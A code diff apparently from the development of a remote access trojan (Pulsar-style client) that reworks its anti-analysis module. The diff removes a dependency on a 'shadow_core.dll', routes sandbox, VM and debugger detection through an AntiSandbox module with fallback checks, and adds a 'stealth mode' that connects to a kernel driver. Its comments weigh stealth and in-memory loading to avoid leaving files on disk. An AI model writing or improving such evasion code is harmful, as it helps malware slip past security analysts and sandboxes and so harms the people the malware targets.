@@ -7,40 +7,53 @@ namespace Intelix.AntiAnalysis
 {
     public static class AdvancedChecks
     {
-        // P/Invoke definitions from our Rust library
-        // We will likely embedded the DLL as a resource and extract it at runtime,
-        // or just expect it to be alongside. For stealth, memory loading would be best,
-        // but P/Invoke requires a file on disk (unless we use manual mapping).
-        // For this version, we assume standard P/Invoke from a temp file.
-        
-        [DllImport("shadow_core.dll", CallingConvention = CallingConvention.Cdecl)]
-        private static extern bool PerformSecurityChecks();
+        // FIXED: Removed dependency on non-existent shadow_core.dll
+        // Now uses local C# AntiSandbox module instead
 
-        [DllImport("shadow_core.dll", CallingConvention = CallingConvention.Cdecl)]
-        private static extern bool InitShadow();
-
-        // Safe wrapper
+        /// <summary>
+        /// Check if environment is safe to run (not a sandbox/VM/debugger)
+        /// </summary>
         public static bool IsSafeEnvironment()
         {
             try
             {
-                // Ensure DLL is available (logic handled elsewhere or assumed present)
-                return PerformSecurityChecks();
+                // Use the new comprehensive AntiSandbox module
+                return Pulsar.Client.Modules.AntiSandbox.IsSafeEnvironment();
             }
             catch (Exception)
             {
-                // If DLL is missing or crashes, assume Unsafe or fail-closed
-                return false; 
+                // Fallback to basic checks if AntiSandbox not available
+                try
+                {
+                    return !Intelix.Helper.AntiVirtual.ProccessorCheck() &&
+                           !Intelix.Helper.AntiVirtual.CheckDebugger() &&
+                           !Intelix.Helper.AntiVirtual.CheckMemory();
+                }
+                catch
+                {
+                    return false;
+                }
             }
         }
 
+        /// <summary>
+        /// Activate stealth mode (connect to kernel driver if available)
+        /// </summary>
         public static void ActivateStealthMode()
         {
             try
             {
-                InitShadow();
+                // Try to connect to Shadow kernel driver
+                using (var kernel = new Pulsar.Plugins.Client.Modules.KernelController())
+                {
+                    if (kernel.Connect())
+                    {
+                        // Kernel driver available - stealth mode activated
+                        return;
+                    }
+                }
             }
-            catch { /* Silent fail */ }
+            catch { /* Silent fail - kernel not available */ }
         }
     }
 }
